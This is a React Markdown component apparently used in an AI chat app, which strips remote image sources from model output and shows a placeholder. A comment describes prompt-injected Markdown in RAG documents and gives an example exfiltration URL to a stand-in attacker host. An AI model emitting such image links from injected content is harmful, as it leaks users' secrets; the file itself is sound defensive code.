import { marked } from "marked";
import { memo, useId, useMemo } from "react";
import ReactMarkdown, {
	type Components,
	defaultUrlTransform,
	type UrlTransform,
} from "react-markdown";
import remarkBreaks from "remark-breaks";
import remarkGfm from "remark-gfm";
import { cn } from "@/lib/utils";
import { CodeBlock, CodeBlockCode, CodeHighlightContext } from "./code-block";

export type MarkdownProps = {
	children: string;
	id?: string;
	className?: string;
	components?: Partial<Components>;
	/** When true, code blocks defer Shiki highlighting until streaming ends. */
	isStreaming?: boolean;
};

function parseMarkdownIntoBlocks(markdown: string): string[] {
	const tokens = marked.lexer(markdown);
	return tokens.map((token) => token.raw);
}

function extractLanguage(className?: string): string {
	if (!className) return "plaintext";
	const match = className.match(/language-(\w+)/);
	return match?.[1] ?? "plaintext";
}

/** True for URLs that resolve against the current origin (relative or data:). */
function isLocalUrl(url: string): boolean {
	if (url.length === 0) return false;
	if (url.startsWith("data:")) return true;
	const colon = url.indexOf(":");
	const slash = url.indexOf("/");
	const questionMark = url.indexOf("?");
	const numberSign = url.indexOf("#");
	// No protocol delimiter before any path/query/fragment marker => relative.
	return (
		colon === -1 ||
		(slash !== -1 && colon > slash) ||
		(questionMark !== -1 && colon > questionMark) ||
		(numberSign !== -1 && colon > numberSign)
	);
}

/**
 * Harden URLs emitted by the model. Untrusted document content retrieved by the
 * RAG tools can contain injected Markdown; an auto-loaded remote image is a
 * zero-click exfiltration channel (the browser GETs `attacker.example/p.png?d=<secret>`).
 *
 * - `src` (images/media): only same-origin/relative or inline `data:` URLs are
 *   allowed through. Any remote `src` is emptied so nothing can auto-fetch.
 * - `href` (links): fall back to react-markdown's `defaultUrlTransform`, which
 *   keeps relative URLs and the safe protocols (http(s), mailto, …) but strips
 *   `javascript:` and other dangerous schemes. Links never auto-fetch.
 */
const safeUrlTransform: UrlTransform = (url, key) => {
	if (key === "src") {
		return isLocalUrl(url) ? url : "";
	}
	return defaultUrlTransform(url);
};

const INITIAL_COMPONENTS: Partial<Components> = {
	img: function ImgComponent({ src, alt, node: _node, ...props }) {
		const url = typeof src === "string" ? src : "";
		// `safeUrlTransform` has already emptied any remote `src`, so a non-local
		// URL here means it was stripped. Render an inert placeholder linking out
		// (click-to-open, never auto-fetched) instead of an <img> that egresses.
		if (!isLocalUrl(url)) {
			return (
				<span className="text-muted-foreground text-sm italic">
					[blocked external image{alt ? `: ${alt}` : ""}]
				</span>
			);
		}
		return (
			<img
				src={url}
				alt={alt ?? ""}
				className="max-h-80 w-auto rounded-lg border"
				{...props}
			/>
		);
	},
	code: function CodeComponent({ className, children, ...props }) {
		const isInline =
			!props.node?.position?.start.line ||
			props.node?.position?.start.line === props.node?.position?.end.line;

		if (isInline) {
			return (
				<span
					className={cn(
						"bg-muted text-foreground rounded-sm px-1 font-mono text-sm",
						className,
					)}
					{...props}
				>
					{children}
				</span>
			);
		}

		const language = extractLanguage(className);

		return (
			<CodeBlock className={className}>
				<CodeBlockCode code={children as string} language={language} />
			</CodeBlock>
		);
	},
	pre: function PreComponent({ children }) {
		return <>{children}</>;
	},
};

const MemoizedMarkdownBlock = memo(
	function MarkdownBlock({
		content,
		components = INITIAL_COMPONENTS,
	}: {
		content: string;
		components?: Partial<Components>;
	}) {
		return (
			<ReactMarkdown
				remarkPlugins={[remarkGfm, remarkBreaks]}
				urlTransform={safeUrlTransform}
				components={components}
			>
				{content}
			</ReactMarkdown>
		);
	},
	function propsAreEqual(prevProps, nextProps) {
		return prevProps.content === nextProps.content;
	},
);

MemoizedMarkdownBlock.displayName = "MemoizedMarkdownBlock";

function MarkdownComponent({
	children,
	id,
	className,
	components = INITIAL_COMPONENTS,
	isStreaming = false,
}: MarkdownProps) {
	const generatedId = useId();
	const blockId = id ?? generatedId;
	const blocks = useMemo(() => parseMarkdownIntoBlocks(children), [children]);
	const highlightContext = useMemo(
		() => ({ streaming: isStreaming }),
		[isStreaming],
	);

	return (
		<CodeHighlightContext.Provider value={highlightContext}>
			<div className={className}>
				{blocks.map((block, index) => (
					<MemoizedMarkdownBlock
						key={`${blockId}-block-${index}`}
						content={block}
						components={components}
					/>
				))}
			</div>
		</CodeHighlightContext.Provider>
	);
}

const Markdown = memo(MarkdownComponent);
Markdown.displayName = "Markdown";

export { Markdown };
